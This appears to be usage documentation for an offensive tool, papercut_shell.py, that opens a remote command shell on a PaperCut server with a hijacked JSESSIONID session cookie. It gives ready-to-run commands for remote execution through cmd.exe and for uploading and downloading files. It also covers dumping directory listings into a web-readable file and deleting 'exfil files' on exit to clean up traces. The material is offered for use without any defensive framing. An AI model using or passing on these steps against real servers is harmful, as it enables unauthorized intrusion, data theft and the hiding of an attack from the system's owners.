To grab the cookie: log in via browser → DevTools → Application/Storage → Cookies → copy the JSESSIONID value.

One-shot command (non-interactive)

python3 papercut_shell.py -u https://papercut:9191 --cookie XXXX -c "whoami"
Interactive shell

python3 papercut_shell.py -u https://papercut:9191 --cookie XXXX
Once connected you get a C:\...>  prompt. Commands run via cmd.exe /c in the remote working directory.

Built-in commands (prefix-matched)
Command	Purpose
whoami, hostname, ipconfig /all, tasklist …	Any normal command → output printed to your terminal
cd <dir> / cd	Change / show remote working directory
dirlist	Recursively list [app]\server\web, append results to list.txt
dirlist "C:\path"	Recursively list an arbitrary path, append to list.txt
upload <local> <remote>	Push a file to the target (chunked)
download <remote> <local>	Pull a file from the target (chunked)
help	Show built-ins
exit	Restore settings, delete exfil files, quit
Reading list.txt
After dirlist, fetch it from your browser or another authenticated request:


https://<papercut>:9191/custom/list.txt
